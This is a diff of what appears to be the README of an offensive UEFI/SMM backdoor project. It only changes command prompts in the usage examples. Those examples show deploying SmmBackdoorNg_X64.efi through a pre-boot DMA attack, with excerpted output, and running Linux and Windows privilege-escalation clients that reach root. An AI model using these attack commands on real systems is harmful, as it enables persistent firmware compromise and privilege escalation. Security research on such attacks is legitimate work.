@@ -20,7 +20,7 @@ Project documentation is incomplete at this moment, but here's some command line
 Deploying SMM backdoor using pre-boot DMA attack:
 
 ```
-$ ./uefi_backdoor_simple.py --driver SmmBackdoorNg_X64.efi
+# python2 uefi_backdoor_simple.py --driver SmmBackdoorNg_X64.efi
 [+] Using UEFI system table hook injection method
 [+] Reading DXE phase payload from SmmBackdoorNg_X64.efi
 [+] Waiting for PCI-E link...
@@ -111,7 +111,7 @@ Basic use of SMM backdoor `smm_backdoor.py` client program:
 Example of `smm_backdoor_privesc_linux.py` client program usage:
 
 ```
-# python2 smm_backdoor_privesc_linux.py
+$ python2 smm_backdoor_privesc_linux.py
 [+] Initializing SMM backdoor client...
 [+] User CR3 = 0x271b14000
 [+] LSTAR = 0xffffffff81e00010
@@ -133,7 +133,7 @@ uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10
 Example of `smm_backdoor_privesc_win.py` client program usage:
 
 ```
-PS C:\> python2 .\smm_backdoor_privesc_win.py
+PS C:\> python2 smm_backdoor_privesc_win.py
 [+] Initializing SMM backdoor client...
 [+] NT version is 10.0.19041
 [+] _EPROCESS Token offset is 0x04b8
